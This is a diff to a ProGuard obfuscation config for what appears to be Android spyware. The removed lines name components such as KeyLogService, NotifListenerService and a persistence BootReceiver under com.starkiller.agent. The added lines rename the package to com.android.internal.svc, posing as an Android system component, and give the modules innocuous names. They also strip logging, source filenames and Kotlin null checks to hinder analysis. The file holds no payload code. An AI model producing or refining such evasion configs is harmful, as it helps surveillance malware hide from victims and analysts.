@@ -5,18 +5,24 @@
 -repackageclasses ''
 -flattenpackagehierarchy ''
 
-# Keep entry points
--keep public class com.starkiller.agent.MainActivity { *; }
--keep public class com.starkiller.agent.StarKillerService { *; }
--keep public class com.starkiller.agent.persistence.BootReceiver { *; }
--keep public class com.starkiller.agent.modules.KeyLogService { *; }
--keep public class com.starkiller.agent.modules.NotifListenerService { *; }
+# Strip source filenames from stack traces
+-renamesourcefileattribute ''
+
+# Keep ONLY manifest-declared components (fully qualified)
+-keep public class com.android.internal.svc.MainActivity { *; }
+-keep public class com.android.internal.svc.SyncService { *; }
+-keep public class com.android.internal.svc.GrantActivity { *; }
+-keep public class com.android.internal.svc.persistence.StartReceiver { *; }
+-keep public class com.android.internal.svc.modules.InputService { *; }
+-keep public class com.android.internal.svc.modules.AlertService { *; }
 
 # Obfuscate everything else
 -dontwarn javax.**
 -dontwarn sun.**
+-dontwarn kotlin.**
+-dontwarn kotlinx.**
 
-# Remove logging
+# Remove all logging
 -assumenosideeffects class android.util.Log {
     public static int v(...);
     public static int d(...);
@@ -24,3 +30,15 @@
     public static int w(...);
     public static int e(...);
 }
+
+# Remove Kotlin null checks (they leak parameter names)
+-assumenosideeffects class kotlin.jvm.internal.Intrinsics {
+    public static void checkNotNullParameter(...);
+    public static void checkNotNullExpressionValue(...);
+    public static void checkNotNull(...);
+}
+
+# Adapt string constants that reference class names
+-adaptclassstrings
+-adaptresourcefilenames
+-adaptresourcefilecontents
